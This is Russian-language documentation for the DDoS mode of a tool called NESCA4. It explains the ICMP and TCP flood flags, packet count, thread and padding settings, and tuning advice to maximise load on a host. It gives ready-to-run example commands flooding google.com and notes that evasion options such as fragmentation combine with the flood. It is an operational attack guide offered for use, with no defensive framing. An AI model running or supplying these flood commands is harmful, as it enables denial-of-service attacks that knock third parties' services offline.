NESCA4 поддерживает DDOS через протоколы TCP и ICMP.

1. Использование:
    -icmp-ddos       Флаг используемый для включения ICMP ddos.
    -tcp-ddos        Флаг используемый для включения TCP ddos.

    -ddos-len <num>  Флаг используемый для указания количества пакетов, число которых указано в аргументах.
    -TDD <num>       Флаг который используется для указания максимального количества потоков (пакетов за раз),
                     число передается в аргументах.

  Но этого недостаточно для нагрузки хоста, необходимо увеличить размер пакета.

    -data-len <num> Флаг позволяющий заполнить пакет случайными символами,
                количество этих символов указывается в аргументах.

  Пример команды для ICMP DDOS-а:
    sudo ./nesca4 google.com -icmp-ddos -ddos-len 10000 -data-len 1400

  Пример для TCP DDOS-а:
    sudo ./nesca4 google.com -tcp-ddos -ddos-len 10000 -data-len 1400 -p 80

2. Особенности:
  Указывать -data-len больше 1400 не рекомендуется, система начнет отклонять пакеты.
  Если вы укажете несколько целей для DDOS-а, NESCA4 нагрузит их все, сначала отправив указанное количество
  пакетов на первый хост, затем на второй и так далее.

  Также стоит сказать, что TCP DDOS будет учитывать первый указанный порт, допустим, вы
  указали -p 80,443,21. DDOS будет именно на 80-м порту.

  Также почти все другие аргументы для сканирования, такие как -frag, или -ack, или -scanflags, поддерживаются и для DDOS-а.

3. Значения по умолчанию:
  * По стандарту -ddos-len имеет значение 5000 пакетов.
  * По стандарту -TDD стоит на 500 потоков.
  * Стандартно -data-len имеет значение 0, отключен нахрен.
